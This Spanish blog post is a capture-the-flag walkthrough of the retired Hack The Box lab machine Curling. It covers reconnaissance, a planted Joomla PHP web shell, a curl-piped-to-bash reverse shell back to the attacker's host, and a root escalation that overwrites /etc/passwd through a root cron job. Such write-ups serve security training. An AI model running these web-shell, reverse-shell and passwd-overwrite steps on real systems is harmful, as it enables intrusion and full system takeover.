---
layout: post
title:  "Maquina  Retirada Curling de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CURLING
tags: HTB, Joomla, CURL, Web Hacking, Maquinas Retiradas, Writeup
---

# Curling ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.150       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
$" nmap -sC -sV -p -oN target 10.10.10.150  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Procedemos a hacer un pequeño Fuzzing con nmap y el script `http-enum`
```bash
# nmap --script http-enum -p80 10.10.10.150 -oN Webscan
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 17:25 CEST
Nmap scan report for 10.10.10.150
Host is up (0.041s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /administrator/manifests/files/joomla.xml: Joomla version 3.8.8
|   /language/en-GB/en-GB.xml: Joomla version 3.8.8
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```
Procedemos a hecharle un vistazo a la pagina web
_foto_
Vemos varios comentarios y enumeramos un posible usuario llamado `"Floris"`

Hacemos #Ctrl+U para inspeccionar el codigo fuente

Nos encontramos al final del codigo fuente de la pagina principal un comentario con un `secret.txt`

Procedemos con: `"http://10.10.10.150/secret.txt"`

Encontramos un hash: `Q3VybGluZzIwMTgh` que parece estar codificado en `base64`

Hacemos un tratamiento de la posible pass encontrada:
```bash
# echo "Q3VybGluZzIwMTgh" | base64 -d       
Curling2018!
``` 

Seguimos comprobando las rutas que nos a enumerado el script de nmap: `"/administrator/"`
Encontramos el Panel Login.
Tenemos:
```bash
User: Floris
Pass: Curling2018!
```
Nos conseguimos loguear correctamente como el user Floris
Una vez dentro nos dirigimos a `TEMPLATES`, elegimos el tema `Beez3` y procedemos a crear un nuevo archivo.
<a href="https://ibb.co/9cqRCyv"><img src="https://i.ibb.co/wBKDxpL/curling-joomla-template-malicius.png" alt="curling-joomla-template-malicius.png" border="0" /></a>

El archivo que vamos a crear va a ser una archivo malicioso `.php`tal que podamos ejecutar comandos a a nivel web para posteriormente lanzarnos una shell
Archivito del Joomla: Nombre: `pros.php`
```php
<?php
    system($_REQUEST['cmd']);
?>
```
Ahora a nivel web vamos a intentar apuntar a nuestro archivo template creado nuevo: `/templates/beez3/pros.php`
Vemos que nos responde y se esta interpretando, procedemos a ejecutar comandos de la siguiente forma:
_foto_
```bash
  "http://10.10.10.150/templates/beez3/pros.php?cmd=whoami"
www-data
``` 
Probamos con las revershell de siempre y vemos que no conseguimos acceso a la maquina.
La Alternativa esta en el uso de CURL para hacer una peticion a un servidor que nos montemos con python3, compartiendo un archivo shell.sh para apunte a nuestro servidor con una Revese_shell:
Archivo `Shell.sh`
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.5/443
```
Teniendo el servidor `python3 -m http.server 80` montado alojando el recurso `Shell.sh`
Procedemos a hacer la Peticion Web:
```bash
  "http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.14.5/Shell.sh"
```
Como output: Vemos que se nos lee el codigo tipo:
`#!/bin/bash bash -i >& /dev/tcp/10.10.14.5/443 0>&1 `

Nos preparamos y nos ponemos a la escucha con `nc -vnlp 443` para recibir la shell.
Ahora paso clave: Pipearlo con `BASH`
Para lograr que se ejecute ahora el codigo:
```bash
  "http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.14.5/Shell.sh|bash"
```
Y de este modo conseguimos nuestra consola como `www-data`
```bash
# nc -vlnp 443 
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.150] 47316
bash: cannot set terminal process group (1335): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html/templates/beez3$ whoami
www-data
```
Hacemos un tratamiento de la tty para poder movernos adecuadamente:
``` bash
www-data@curling:/$ "script /dev/null -c bash"
script /dev/null -c bash
Script started, file is /dev/null
www-data@curling:/$ "^Z"        #Ctrl+z
zsh: suspended  nc -vlnp 443
                                                                                                                                                           
┌──(root💀K0)-[/home/…/HTB/Curling/content]
└─# "stty raw -echo;fg  "                                                                                                                          148 ⨯ 1 ⚙
[1]  + continued  nc -vlnp 443
                              "reset"
reset: unknown terminal type unknown
Terminal type? "xterm"
www-data@curling:/$ "export TERM=xterm"
www-data@curling:/$ "export SHELL=bash"
www-data@curling:/$ 
```
Nos movemos a la carpeta `/home/floris`:
```bash
www-data@curling:/home$ ls -l floris/
total 12
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
``` 
Vemos que tenemos 1 directorio y dos archivos, del cual nosotros como `www-data` solo podemos leer el password_backup:
```hex
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```
Vemos que es un archivo en `HEXADECIMAL` probamos a reversearlo con el commando `xxd -r password_backup` y almacenarlo en `/tmp/password-backup` usar el comando `file` para ver que tipo de archivo es:
```bash
www-data@curling:/home/floris$ xxd -r password_backup > /tmp/password_backup 
www-data@curling:/home/floris$ file /tmp/password_backup 
"/tmp/password_backup: bzip2 compressed data, block size = 900k    "
```
Ahora nos vamos a compartir el archivo con un servidor que nos montamos desde la maquina victima para poder descargarnos el recurso alojado en `/tmp/password_backup`: ("Situado en la ruta /tmp/")
```python
$ python3 -m http.server 8000
``` 
Usamos el comando: `wget http://10.10.10.150:8000/password_backup`
Procedemos a descomprimir el archivos unas 4 o 5 veces haciendo uso de: `$ 7z x password_backup` multiples veces hasta que
obtenemos el ultimo fichero que se llama `"password.txt"` y almacena: 
```bash
# cat password.txt    
5d<wdCbdZu)|hChXll
```
Posible contraseña del user Floris:
```bash
www-data@curling:/$ su floris
Password: 5d<wdCbdZu)|hChXll
floris@curling:/$ 
```
Apartir de aqui ya podriamos visualizar la flag `user.txt` localizada en `/home/floris/user.txt`
```bash
floris@curling:/home$ cat floris/user.txt 
65dd1df0713b40d88ead98cf1......
``` 

# Escalada de Privilegios al user Root

Vemos que tenemos un directorio en la carpeta /home/floris/admin-area
```bash
floris@curling:~/admin-area$ ls
input  report
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"
``` 
Vemos que el fichero input almacena una url, probamos a montarnos un servidor con python3 y cambiar la url del archiv `input`por la de nuestro servidor
a ver si recibimos una peticion a nivel web.
```bash
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.150 - - [21/May/2021 16:44:01] code 404, message File not found
10.10.10.150 - - [21/May/2021 16:44:01] "GET /prueba HTTP/1.1" 404 -
``` 
Comprobamos que hay una tarea CRON por detras que posiblemente sea del user Root que nos la esta ejecutando el archivo input.

Vale pues llegados a este punto nosotros podriamos copiarnos el archivo `/etc/passwd` del user `floris`, para crearnos una contraseña en formato Unix para ponerla en el archivo nuevo de `passwd` que nos vamos a crear para posteriormente atraves del archivo `input` modificarlo y hacer que nos lo guarde en su propio `/etc/paswd`a nivel de root con la contraseña que le hallamos puesto.

Paso 1.- Copiarse el /etc/pàsswd de floris
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
floris:x:1000:1004:floris:/home/floris:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```
Paso 2.- Crearnos una contraseña para el user Root y pegarla en el nuevo `passwd`:
```bash
# openssl passwd
Password: hola
Verifying - Password: hola
kuaLSx9HZad7.
```
Pegandola en el archivo `passwd` en nuestra maquina, para el user `root`:
```bash
root:kuaLSx9HZad7.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
floris:x:1000:1004:floris:/home/floris:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```
Modificamos el archivo `input` para que nos lance la peticion a nuestro servidor y sobrescriba el fichero`/etc/passwd` del user `root`:
```bash
url = "http://10.10.16.132/passwd"
output = "/etc/passwd"
``` 

Vale teniendo nuestro ficherito ya listo para compartirlo, nos montamos el servidor con python3
```bash
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.150 - - [21/May/2021 17:04:02] "GET /passwd HTTP/1.1" 200 -
``` 
Ahi nos lo hace y comprobamos el fichero /etc/passwd, a ver si se a sobrescrito correctamente con la pass indicada para el user  `root`
```bash
floris@curling:~/admin-area$ cat /etc/passwd
root:kuaLSx9HZad7.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
floris:x:1000:1004:floris:/home/floris:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
floris@curling:~/admin-area$ 
```
Y vemos que si, asique porque no vamos a pasarnos al user root:
```bash
floris@curling:~/admin-area$ su root
Password: 
root@curling:/home/floris/admin-area#
```
Y ya procederiamos a ver la flag de `root/root.txt`:
```bash
root@curling:/home/floris/admin-area# cat /root/root.txt 
82c198ab6fc5365fdc6da2ee.....
```

!! Conseguido !! Maquina Rooteada !! :) 
